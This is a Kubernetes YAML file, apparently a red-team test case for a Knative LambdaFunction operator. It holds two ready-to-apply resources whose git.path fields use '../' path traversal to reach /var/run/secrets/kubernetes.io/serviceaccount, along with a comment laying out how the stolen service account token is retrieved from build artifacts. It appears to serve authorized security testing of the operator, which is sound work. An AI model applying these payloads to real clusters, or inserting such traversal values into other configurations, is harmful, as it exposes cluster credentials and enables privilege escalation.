# BLUE-005: Path Traversal - Read Service Account Token
# ⚠️ AUTHORIZED TESTING ONLY
#
# This exploit uses path traversal in the git.path field to
# read the Kubernetes service account token from the build context.
#
# Attack Flow:
# 1. Create LambdaFunction with path containing ../
# 2. Operator clones repository and applies path
# 3. filepath.Join doesn't validate traversal
# 4. Files from outside repo directory included in build
# 5. Attacker retrieves SA token from build artifacts
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-005-read-sa-token
  labels:
    redteam: "true"
    exploit: "blue-005"
    target: "sa-token"
  annotations:
    redteam.knative.io/description: "Path traversal to read SA token"
spec:
  source:
    type: git
    git:
      url: "https://github.com/knative/docs"
      ref: "main"
      # Path traversal to reach SA token directory
      path: "../../../var/run/secrets/kubernetes.io/serviceaccount"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-005-read-sa-token-alt
  labels:
    redteam: "true"
    exploit: "blue-005"
    target: "sa-token-alt"
spec:
  source:
    type: git
    git:
      url: "https://github.com/knative/docs"
      ref: "main"
      # Alternate path with more traversal
      path: "../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
